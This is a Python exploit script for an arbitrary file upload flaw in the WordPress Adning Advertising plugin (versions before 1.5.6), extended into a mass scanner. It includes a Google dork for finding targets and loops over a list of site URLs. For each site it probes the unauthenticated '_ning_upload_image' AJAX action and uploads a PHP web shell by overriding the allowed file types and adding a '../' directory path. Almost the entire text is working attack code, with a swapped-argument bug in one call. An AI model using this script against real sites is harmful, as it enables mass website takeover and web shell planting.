# Exploit Title: WordPress Plugin Adning Advertising 1.5.5 - Arbitrary File Upload
# Google Dork: inurl:/wp-content/plugins/angwp
# Date: 23/12/2020
# Exploit Author: spacehen
# Vendor Homepage: http://adning.com/
# Version: <1.5.6
# Tested on: Ubuntu 20.04.1 LTS (x86)
# add mass scanner: Krypton-Byte
# author for this version : https://github.com/krypton-byte

import os.path
from os import path
import json
import requests
import sys
import threading

def print_banner():
	print("Adning Advertising < 1.5.6 - Arbitrary File Upload")
	print("Author -> space_hen (www.lunar.sh)")

def print_usage():
	print("Usage: python3 exploit.py [target url] [php file]")
	print("Ex: python3 exploit.py https://example.com ./shell.php")

def vuln_check(uri):
	response = requests.get(uri)
	raw = response.text

	if ("no files found" in raw):
		return True
	else:
		return False
def checkVln(base, file_path):
	ajax_action = '_ning_upload_image'
	admin = '/wp-admin/admin-ajax.php'
	uri = base + admin + '?action=' + ajax_action 
	check = vuln_check(uri)
	
	if(check == False):
		print(f"(*) {base} not vulnerable!")
	else:
		main(file_path, base)
def main(base, file_path):
	ajax_action = '_ning_upload_image'
	admin = '/wp-admin/admin-ajax.php'
	uri = base + admin + '?action=' + ajax_action 
	check = vuln_check(uri)
	files = {'files[]' : open(file_path)}
	data = {
	"allowed_file_types" : "php,jpg,jpeg",
	"upload" : json.dumps({"dir" : "../"})
	}
	print("Uploading Shell...")
	response = requests.post(uri, files=files, data=data )
	file_name = path.basename(file_path)
	if(file_name in response.text):
		print(f"{base} Shell Uploaded!")
		if(base[-1] != '/'):
			base += '/'
		print(base + file_name)
	else:
		print(f"{base} Shell Upload Failed")

if __name__ == '__main__':
    if sys.argv[2] in os.listdir('.') and sys.argv[1] in os.listdir('.'):
        for i in open(sys.argv[1], 'r').read().splitlines():
            checkVln(i, sys.argv[2])
    else:
        print("File Tidal Di Temukan")